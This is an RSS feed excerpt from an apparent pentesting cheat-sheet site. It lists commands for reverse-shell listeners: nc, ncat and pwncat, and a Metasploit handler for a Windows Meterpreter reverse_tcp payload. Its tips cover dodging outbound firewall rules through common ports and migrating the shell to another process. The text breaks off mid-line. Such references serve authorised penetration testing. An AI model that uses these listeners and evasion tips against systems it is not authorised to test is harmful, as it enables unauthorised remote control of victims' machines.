channel.title: Listener on TLDRBins
channel.description: Recent content in Listener on TLDRBins

item.title: Listeners
item.description: Listener Tools nc ncat pwncat rlwrap nc -lvnp <LOCAL_PORT> # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp <LOCAL_PORT> pwncat-cs -lp <LOCAL_PORT> # After getting a connection back Ref: pwncat

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> set AutoRunScript multi_console_command -r automigrate.
